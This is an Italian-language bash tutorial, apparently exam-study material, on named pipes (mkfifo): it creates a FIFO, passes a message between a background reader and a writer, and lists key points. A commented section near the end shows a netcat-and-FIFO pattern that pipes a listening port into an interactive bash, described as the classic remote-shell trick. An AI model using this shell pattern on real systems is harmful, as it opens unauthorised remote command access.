s#!/bin/bash

# ==============================================================================
# 52. NAMED PIPES (FIFO) & IPC (MACOS / LINUX)
# ==============================================================================
# OBIETTIVO:
# Creare un "tubo" (Pipe) persistente nel filesystem per far comunicare due
# terminali o due script diversi.
#
# CONCETTO:
# Una PIPE normale (|) passa dati solo tra processi figli.
# Una NAMED PIPE (mkfifo) è un file speciale che permette a processi NON correlati
# di scambiarsi dati. Uno scrive, l'altro legge.
#
# ATTENZIONE:
# La FIFO si blocca (BLOCKING) finché non c'è sia un lettore che uno scrittore.
# ==============================================================================

PIPE_NAME="ilmiotubo"

# ------------------------------------------------------------------------------
# 1. CREAZIONE FIFO
# ------------------------------------------------------------------------------
echo "--- 1. MKFIFO ---"

# Rimuovi se esiste (per pulizia)
rm -f "$PIPE_NAME"

# Crea la pipe
mkfifo "$PIPE_NAME"

# Verifica che sia un file speciale 'p' (pipe)
ls -l "$PIPE_NAME"
# Output atteso: prw-r--r-- ... (la 'p' iniziale è la chiave)


# ------------------------------------------------------------------------------
# 2. SIMULAZIONE COMUNICAZIONE (SCRITTORE E LETTORE)
# ------------------------------------------------------------------------------
# Per testarlo in un solo script, dobbiamo usare il background (&).

echo "----------------------------------------------------------------"
echo "--- 2. COMUNICAZIONE ---"

# AVVIO IL LETTORE (IN BACKGROUND)
# Il lettore si metterà in attesa sul file.
echo "[Lettore] In attesa di dati..."
cat "$PIPE_NAME" > output_ricevuto.txt &
PID_LETTORE=$!

sleep 1

# AVVIO LO SCRITTORE
# Scrivo dentro il tubo. Appena scrivo, il lettore si sblocca.
echo "[Scrittore] Invio dati nel tubo..."
echo "Messaggio Segreto via FIFO" > "$PIPE_NAME"

# Attendiamo che il lettore finisca
wait "$PID_LETTORE"

echo "[Main] Dati ricevuti:"
cat output_ricevuto.txt


# ------------------------------------------------------------------------------
# 3. NETCAT CON FIFO (REVERSE SHELL TRICK) - VISTO IN FILE 11
# ------------------------------------------------------------------------------
# Le slide mostrano l'uso di FIFO con nc per creare chat bidirezionali.
# mkfifo f
# nc -l 1234 < f | /bin/bash -i > f 2>&1
# (Questo è il pattern classico per le shell remote su sistemi senza -e).


# ==============================================================================
# ⚠️ PUNTI CHIAVE PER ESAME
# ==============================================================================
# 1. mkfifo crea il file.
# 2. 'cat pipe' si blocca finché qualcuno non fa 'echo ... > pipe'.
# 3. 'echo ... > pipe' si blocca finché qualcuno non fa 'cat pipe'.
# 4. È il metodo standard POSIX per IPC (Inter-Process Communication).

# Pulizia
rm -f "$PIPE_NAME" output_ricevuto.txt
echo "----------------------------------------------------------------"
echo "Tutorial 52 (FIFO) Completato."